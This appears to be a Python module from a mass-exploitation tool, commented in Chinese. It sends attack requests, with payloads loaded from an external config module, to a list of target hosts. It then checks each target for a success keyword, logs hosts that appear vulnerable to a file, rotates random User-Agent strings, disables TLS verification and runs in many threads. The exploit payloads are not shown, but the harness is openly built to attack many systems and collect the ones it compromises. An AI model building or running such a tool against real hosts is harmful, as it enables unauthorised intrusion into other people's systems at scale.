import threading
from fake_useragent import UserAgent
import requests
import urllib3
import config
import color


def attack_one(rhost, exp=None, outfile=None):
    ua = UserAgent()
    httpline = "https://" + rhost
    headers = {"Referer": httpline,
               "User-Agent": ua.random,
               "Content-Type": "application/x-www-form-urlencoded",
               "Accept-Encoding": "gzip",
               }

    try:
        urllib3.disable_warnings()

        # 第一个初始url
        httpline_req = httpline + config.url(exp)
        payload = config.payload(exp)

        # 判断method
        if config.method(exp) == "post":
            # 攻击请求
            requests.post(url=httpline_req, data=payload, headers=headers, verify=False, timeout=5)

            if config.method_v(exp) == "post":
                httpline_v = httpline + config.verify(exp)
                response = requests.post(url=httpline_v, data=payload, headers=headers, verify=False, timeout=5)

            elif config.method_v(exp) == "get":
                httpline_v = httpline + config.verify(exp)
                response = requests.get(url=httpline_v, headers=headers, verify=False, timeout=5)

        elif config.method(exp) == "get":
            # 攻击请求
            requests.get(url=httpline_req, params=payload, headers=headers, verify=False, timeout=5)

            # 验证攻击是否成功
            if config.method_v(exp) == "get":
                httpline_v = httpline + config.verify(exp)
                response = requests.get(url=httpline_v, params=payload, headers=headers, verify=False, timeout=5)
            elif config.method_v(exp) == "post":
                httpline_v = httpline + config.verify(exp)
                response = requests.post(url=httpline_v, data=payload, headers=headers, verify=False, timeout=5)

        if response.status_code == 200:
            resp_text = response.text
            result = config.check(config.word(exp), resp_text)
            if result:
                print(color.success(httpline_req))
                if outfile is not None:
                    with open(outfile, "a") as f:
                        f.writelines(httpline + "\n")
            else:
                print(color.failed(httpline_req))
        else:
            print(color.failed(httpline_req))
    except:
        print(color.error(httpline_req))


def attack_all(file, exp=None, outfile=None):
    for line in file:
        rhost = line.strip()
        attack_one(rhost, exp, outfile)


def attack_all_threads(file, exp=None, thread_num=None, outfile=None):
    if thread_num is not None:
        threads = []
        for i in range(thread_num):
            t = threading.Thread(target=attack_all, args=(file, exp, outfile))
            threads.append(t)
        for t in threads:
            t.start()
        for t in threads:
            t.join()
